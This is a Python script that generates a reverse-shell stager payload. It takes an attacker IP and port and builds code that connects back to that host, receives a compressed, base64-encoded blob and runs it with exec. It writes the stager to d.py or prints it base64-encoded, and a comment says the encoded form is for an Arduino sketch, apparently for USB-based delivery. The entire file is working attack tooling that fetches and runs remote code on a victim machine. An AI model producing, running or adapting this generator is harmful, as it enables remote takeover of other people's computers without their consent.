import argparse
import sys
import base64 

parser = argparse.ArgumentParser()

try:
  sys.argv[1]
except:
  print(
    "usage: -i ip address to connect to\n"
    "usage: -p port number\n"
    "usage: -py True, only generates python payload -- optional flag"
    "usage: -h show help"
  )

parser.add_argument("-i", "--ipaddress", help="IP address")
parser.add_argument("-p", "--port", help="Port number")
parser.add_argument("-py", "--python", help="only generates python payload")

args = parser.parse_args()
if(args.ipaddress and args.port):    
  IP_ADDRESS = args.ipaddress
  PORT = args.port
else:
  print("Please specify options. -h for more help.")
  exit()

#options received
print(IP_ADDRESS)
print(PORT)
PARTIAL = "'s':s"

payload = f"import socket,zlib,base64,struct,time\nfor x in range(10):\n\ttry:\n\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\ts.connect(('{IP_ADDRESS}',{PORT}))\n\t\tbreak\n\texcept:\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)\nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(zlib.decompress(base64.b64decode(d)),{{{PARTIAL}}})\n"

if(args.python):
  f = open("d.py", "w")
  f.write(payload)

else: #generate Arduino sketch
  PAYLOAD_BYTES = payload.encode("ascii")
  ENCODED_BYTES = base64.b64encode(PAYLOAD_BYTES)
  ENCODED_PAYLOAD = ENCODED_BYTES.decode("ascii")
  print(ENCODED_PAYLOAD)
